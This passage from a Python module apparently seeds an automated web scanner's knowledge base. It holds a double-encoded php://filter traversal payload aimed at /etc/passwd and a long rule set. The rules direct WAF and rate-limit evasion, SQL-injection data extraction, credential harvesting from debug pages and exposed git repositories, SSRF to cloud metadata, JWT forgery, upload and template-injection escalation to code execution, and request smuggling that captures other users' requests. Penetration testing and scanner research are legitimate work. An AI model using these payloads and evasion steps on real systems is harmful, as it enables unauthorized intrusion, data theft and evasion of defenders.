         "php://filter/convert.base64-encode/resource=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
         ["double_url_encode(path)", "wrap(php_filter)"],
         "waf",
         0.65, "Double encoding within PHP stream wrapper")

    return patterns


# ===================================================================
# MODULE 3: Scan Feedback Loop Templates
# ===================================================================

def _feedback_rules() -> list[dict]:
    """Generate 25+ scan feedback strategy rules."""
    rules: list[dict] = []

    def _add(condition: str, action: str, reason: str,
             priority: str, category: str, confidence: float = 0.85):
        rules.append({
            "pattern_type": "scan_feedback",
            "technology": None,
            "vuln_type": None,
            "confidence": confidence,
            "sample_count": 100,
            "pattern_data": {
                "key": f"feedback:{category}:{condition[:50]}",
                "condition": condition,
                "action": action,
                "reason": reason,
                "priority": priority,
                "category": category,
            },
        })

    # --- Detection ---
    _add(
        "Target returns 403 on common paths (/admin, /wp-admin, /console)",
        "Try path normalization bypasses: ..;/, /./admin, /admin..;/, %2e%2e%3b/admin, URL-encoded variations",
        "403 responses indicate WAF or access control that may have normalization gaps",
        "high", "evasion",
    )
    _add(
        "WAF detected (Cloudflare identified via cf-ray header or __cfduid cookie)",
        "Switch to stealth mode: add 2-5s random delays between requests, rotate User-Agent, use encoded payloads, avoid common scanner signatures",
        "Cloudflare rate-limits and blocks automated scanners; stealth reduces detection",
        "high", "evasion",
    )
    _add(
        "WAF detected (generic: 406/429 responses, security headers like X-WAF)",
        "Enable WAF evasion module, try payload encoding chains, reduce request rate",
        "Any WAF requires adapted scanning strategy to get accurate results",
        "high", "evasion",
    )
    _add(
        "No vulnerabilities found after endpoint discovery phase",
        "Try API fuzzing paths: /api, /api/v1, /api/v2, /graphql, /rest, /_api, /swagger.json, /openapi.json",
        "Many modern apps expose API endpoints not linked from HTML; API vulns are common",
        "medium", "strategy",
    )
    _add(
        "SQL injection found in a parameter",
        "Also test for blind SQL injection (boolean-based, time-based), UNION-based extraction, error-based, and stacked queries on same and nearby endpoints",
        "If one SQLi exists, the codebase likely has more; also extract data via the confirmed vector",
        "high", "escalation",
    )
    _add(
        "XSS found in one parameter of an endpoint",
        "Test ALL other parameters on the same endpoint and related endpoints for XSS; check both reflected and stored contexts",
        "If one parameter lacks sanitization, likely others do too; same code patterns repeat",
        "high", "escalation",
    )
    _add(
        "React/Vue/Angular SPA detected (JS framework fingerprinted)",
        "Focus on DOM XSS, check postMessage handlers, analyze JavaScript for API keys, test client-side routing for unauthorized access",
        "SPAs have unique attack surface: DOM manipulation, client-side auth, exposed API endpoints",
        "high", "strategy",
    )
    _add(
        "nginx detected (Server header or default error pages)",
        "Check for off-by-slash misconfiguration (/..;/), alias traversal, try /nginx_status, check for proxy_pass misconfig",
        "nginx misconfigurations are common and can lead to path traversal and information disclosure",
        "medium", "detection",
    )
    _add(
        "WordPress detected (wp-content, wp-includes, or meta generator tag)",
        "Run WordPress-specific checks: xmlrpc.php bruteforce/pingback, wp-json/wp/v2/users enumeration, plugin/theme version detection, known CVEs per version",
        "WordPress has a large attack surface via plugins, themes, and core; version-specific CVEs are common",
        "high", "strategy",
    )
    _add(
        "Spring Boot detected (Whitelabel error page, /actuator, spring headers)",
        "Check actuator endpoints (/actuator/env, /actuator/heapdump, /actuator/mappings), test for SpEL injection, check for Eureka/Config server exposure",
        "Spring Boot actuators often expose sensitive data; SpEL injection can lead to RCE",
        "high", "strategy",
    )
    _add(
        "GraphQL endpoint found (/graphql responds to introspection query)",
        "Run introspection query to map schema, test for query batching, nested query DoS, authorization bypass on mutations, information disclosure via error messages",
        "GraphQL APIs often have weaker access controls and are vulnerable to abuse via complex queries",
        "high", "strategy",
    )
    _add(
        "JWT tokens detected in Authorization header or cookies",
        "Test none algorithm attack, weak secret bruteforce (common secrets list), kid parameter injection, jwk header injection, algorithm confusion (RS256→HS256)",
        "JWT implementation flaws are extremely common and can lead to auth bypass",
        "high", "escalation",
    )
    _add(
        "CORS misconfiguration detected (Access-Control-Allow-Origin reflects input)",
        "Test credential reflection (Access-Control-Allow-Credentials: true with reflected origin), null origin, subdomain trust, wildcard with credentials",
        "CORS misconfigs can allow cross-origin data theft when combined with credentials",
        "medium", "escalation",
    )
    _add(
        "CSP header present but may be bypassable",
        "Analyze CSP policy: check for unsafe-inline, unsafe-eval, data: scheme, whitelisted CDN domains (e.g., cdnjs.cloudflare.com for JSONP), base-uri gaps",
        "CSP bypasses are common when policies whitelist broad domains or allow unsafe directives",
        "medium", "detection",
    )
    _add(
        "Rate limiting detected (429 responses or increasing response delays)",
        "Slow down request rate, rotate User-Agent headers, use different URL path casing, try API endpoints that may have separate rate limits",
        "Adapting request patterns avoids bans and allows continued scanning",
        "high", "evasion",
    )
    _add(
        "Login form found on target (username/password fields detected)",
        "Check for username enumeration (different responses for valid vs invalid users), test for bruteforce protection, check for default credentials, test password reset flow",
        "Authentication flows are high-value targets with multiple potential weaknesses",
        "high", "detection",
    )
    _add(
        "File upload functionality found (multipart/form-data endpoint)",
        "Test polyglot files (GIF89a + PHP), double extension (.php.jpg), null byte (.php%00.jpg), content-type manipulation, SVG XSS upload, .htaccess upload",
        "File upload is a critical attack vector that can lead to RCE; many validation bypasses exist",
        "high", "escalation",
    )
    _add(
        "API versioning detected (e.g., /v3/ in URL paths)",
        "Test older API versions (/v1/, /v2/) which may have removed authentication or authorization checks, different input validation",
        "Legacy API versions often retain deprecated endpoints with weaker security controls",
        "medium", "strategy",
    )
    _add(
        "HTTP 500 error returned on crafted input (unexpected server error)",
        "This is likely an injection point. Increase fuzzing intensity: try SQLi, SSTI, command injection, format string, LDAP injection on this parameter",
        "Unhandled exceptions indicate insufficient input validation — prime injection targets",
        "high", "detection",
    )
    _add(
        "Debug mode detected (detailed error pages, stack traces, or /debug endpoint)",
        "Extract configuration details, database credentials, API keys from debug output; check for Django debug toolbar, PHP phpinfo(), Spring Boot actuator/env",
        "Debug mode exposes internal details that aid further exploitation and may contain credentials",
        "high", "detection",
    )
    _add(
        ".git directory exposed (/.git/HEAD returns git content)",
        "Dump git repository using git-dumper, analyze commit history for secrets, API keys, passwords, database credentials in historical commits",
        "Exposed git repos frequently contain hardcoded secrets and reveal application architecture",
        "high", "escalation",
    )
    _add(
        "SSRF indicator found (URL parameter that fetches external resources)",
        "Test internal network access: http://127.0.0.1, http://169.254.169.254 (AWS metadata), http://[::1], file:// protocol, gopher:// protocol for internal service interaction",
        "SSRF can access cloud metadata, internal services, and bypass network segmentation",
        "high", "escalation",
    )
    _add(
        "Subdomain enumeration reveals dev/staging environments",
        "Prioritize scanning dev/staging subdomains — they typically have weaker security controls, debug modes enabled, default credentials, and unpatched software",
        "Development environments are often the weakest link and may share credentials with production",
        "high", "strategy",
    )
    _add(
        "WebSocket endpoint detected (ws:// or wss:// protocol)",
        "Test WebSocket for injection (SQLi, XSS in message content), check for authentication on WS connection, test cross-site WebSocket hijacking (CSWSH)",
        "WebSocket connections often lack the same security controls as HTTP endpoints",
        "medium", "detection",
    )
    _add(
        "Multiple technologies detected (e.g., PHP backend + Node.js microservice)",
        "Test interaction boundaries between services: SSRF between services, deserialization at service boundaries, encoding differences between tech stacks",
        "Technology boundaries create parsing inconsistencies and trust assumption gaps",
        "medium", "strategy",
    )
    _add(
        "S3 bucket or cloud storage URL found in responses",
        "Test for public listing (no auth), test for write access, check for misconfigured bucket policies, enumerate other bucket names based on naming patterns",
        "Cloud storage misconfigurations are extremely common and can expose sensitive data",
        "high", "detection",
    )
    _add(
        "Server-Side Template Injection (SSTI) indicator: math expression evaluated in response",
        "Identify template engine (Jinja2, Twig, Freemarker, Velocity, Thymeleaf), use engine-specific RCE payloads, escalate from detection to code execution",
        "SSTI detection should immediately escalate to RCE testing since most template engines allow code execution",
        "high", "escalation",
    )
    _add(
        "HTTP request smuggling indicators (inconsistent Content-Length handling)",
        "Test CL.TE, TE.CL, and TE.TE variants; attempt to poison cache, bypass access controls, capture other users' requests",
        "Request smuggling can affect all users of the application and bypass front-end security",
        "high", "escalation",
        confidence=0.8,
    )

    return rules


# ===================================================================
# PUBLIC API — Three injection entry points
# ===================================================================

async def inject_waf_evasion_knowledge(db: AsyncSession) -> dict:
    """Module 1: Inject 100+ WAF bypass payloads for top 10 WAFs."""
    patterns = _waf_evasion_payloads()
    logger.info(f"WAF Evasion Lab: injecting {len(patterns)} bypass payloads")
    stats = await _dedup_and_insert(db, patterns, dedup_key_field="key")
    logger.info(
        f"WAF Evasion Lab complete: {stats['created']} created, "
        f"{stats['skipped']} skipped"
    )
    return stats


async def inject_mutation_knowledge(db: AsyncSession) -> dict:
    """Module 2: Inject 30+ payload mutation technique patterns."""
    patterns = _mutation_knowledge()
    logger.info(f"Mutation Engine: injecting {len(patterns)} mutation patterns")
    stats = await _dedup_and_insert(db, patterns, dedup_key_field="key")
    logger.info(
        f"Mutation Engine complete: {stats['created']} created, "
        f"{stats['skipped']} skipped"
    )
    return stats


async def inject_feedback_knowledge(db: AsyncSession) -> dict:
    """Module 3: Inject 25+ scan feedback loop strategy rules."""
    patterns = _feedback_rules()
    logger.info(f"Feedback Loop: injecting {len(patterns)} strategy rules")
    stats = await _dedup_and_insert(db, patterns, dedup_key_field="key")
    logger.info(
        f"Feedback Loop complete: {stats['created']} created, "
        f"{stats['skipped']} skipped"
    )
    return stats


async def inject_all_advanced_training(db: AsyncSession) -> dict:
    """Run all three advanced training modules. Returns combined stats."""
    combined = {"created": 0, "skipped": 0, "categories": {}, "modules": {}}

    for name, func in [
        ("waf_evasion_lab", inject_waf_evasion_knowledge),
        ("mutation_engine", inject_mutation_knowledge),
        ("feedback_loop", inject_feedback_knowledge),
    ]:
        stats = await func(db)
        combined["created"] += stats["created"]
        combined["skipped"] += stats["skipped"]
        combined["modules"][name] = stats
        for cat, count in stats["categories"].items():
            combined["categories"][cat] = combined["categories"].get(cat, 0) + count

    logger.info(
        f"Advanced Training complete: {combined['created']} total created, "
        f"{combined['skipped']} total skipped across 3 modules"
    )
    return combined
